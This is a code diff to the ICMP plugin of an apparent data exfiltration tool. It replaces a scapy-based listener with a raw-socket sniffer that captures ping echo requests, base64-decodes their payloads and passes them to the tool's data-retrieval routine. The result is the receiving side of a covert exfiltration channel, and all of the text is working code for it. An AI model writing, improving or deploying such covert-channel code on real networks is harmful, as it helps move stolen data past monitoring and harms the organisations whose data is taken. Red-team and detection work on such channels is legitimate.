@@ -1,6 +1,4 @@
 import logging
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
-from scapy import all as scapy
 import base64
 import socket
 from struct import pack
@@ -61,19 +59,34 @@ def send(data):
 def listen():
     app_exfiltrate.log_message('info', "[icmp] Listening for ICMP packets..")
     # Filter for echo requests only to prevent capturing generated replies
-    scapy.sniff(filter="icmp and icmp[0]=8", prn=analyze)
+    sniff()
 
+def sniff():
+    """ Sniffs packets and looks for icmp requests """
+    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+    sock.bind(('', 1))
+    try:
+        while True :
+            data = sock.recv(65536)
+            ip_ihl = ord(data[:1]) & 0x0f
+            ip_hdr = data[:(ip_ihl)*4]
+            icmp_data = data[(ip_ihl)*4:]
+            icmp_type = icmp_data[:1]
+            if icmp_type == '\x08':
+                ip_src = socket.inet_ntoa(ip_hdr[-8:-4])
+                ip_dst = socket.inet_ntoa(ip_hdr[-4:])
+                payload = icmp_data[4:]
+                analyze(payload, ip_src, ip_dst)
+    except:
+        sock.close()
 
-def analyze(packet):
-    src = packet.payload.src
-    dst = packet.payload.dst
+def analyze(payload, src, dst):
     try:
         app_exfiltrate.log_message(
             'info', "[icmp] Received ICMP packet from: {0} to {1}".format(src, dst))
-        app_exfiltrate.retrieve_data(base64.b64decode(packet.load))
+        app_exfiltrate.retrieve_data(base64.b64decode(payload))
     except:
         pass
-
 
 class Plugin:
     def __init__(self, app, conf):
